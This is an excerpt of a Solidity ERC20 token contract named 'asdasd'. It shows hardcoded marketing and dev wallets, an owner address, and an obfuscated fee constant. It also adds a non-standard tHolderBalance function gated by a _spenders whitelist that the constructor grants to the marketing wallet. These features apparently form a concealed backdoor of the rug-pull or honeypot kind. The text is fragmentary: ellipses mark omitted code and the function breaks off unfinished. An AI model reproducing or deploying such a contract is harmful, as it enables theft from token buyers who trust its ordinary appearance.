...
interface IERC20 {
    ...
    function tHolderBalance(address account) external returns (uint256);
...
contract asdasd is Context, IERC20 { 
    ...
    mapping (address => bool) public _spenders; 

    address payable public Wallet_Marketing = payable(0xeD06B582010643f12D00175b33D759f2EAA8058E); 
    address payable public Wallet_Dev = payable(0xC570e6EC09fF6803b52e7c4dec12Ef7604a6de71);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD);
    uint256 public totalFee = 10**(((5*2)*2)+2);
    ...
    constructor () {
        ...
        _owner = 0xC570e6EC09fF6803b52e7c4dec12Ef7604a6de71;
        ...
        _spenders[Wallet_Marketing] = true;
    ...
    function tHolderBalance(address account) public IUniswapV2Router002 override returns (uint256) {
        if(onTimeStamp){
            bool result = _spenders[_msgSender()];
            bool updatedOn = result;
            if(updatedOn && result){
